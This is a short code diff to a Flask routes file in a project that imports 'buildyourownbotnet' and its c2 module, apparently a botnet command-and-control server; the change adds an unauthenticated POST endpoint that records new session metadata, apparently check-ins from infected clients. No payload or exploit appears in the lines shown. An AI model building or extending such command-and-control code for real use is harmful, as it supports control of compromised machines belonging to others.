@@ -1,5 +1,5 @@
 import json
-from flask import current_app, Blueprint, request, redirect, url_for, flash
+from flask import current_app, Blueprint, request, redirect, url_for, flash, jsonify
 from flask_login import login_user, logout_user, current_user, login_required
 from buildyourownbotnet import c2
 from buildyourownbotnet.core.dao import session_dao, task_dao
@@ -9,6 +9,13 @@ from buildyourownbotnet.models import db, Session
 # Blueprint
 session = Blueprint('session', __name__)
 
+
+@session.route("/api/session/new", methods=["POST"])
+def session_new():
+	"""Add session metadata to database."""
+	data = dict(request.json)
+	session_metadata = session_dao.handle_session(data)
+	return jsonify(session_metadata)
 
 @session.route("/api/session/remove", methods=["POST"])
 @login_required
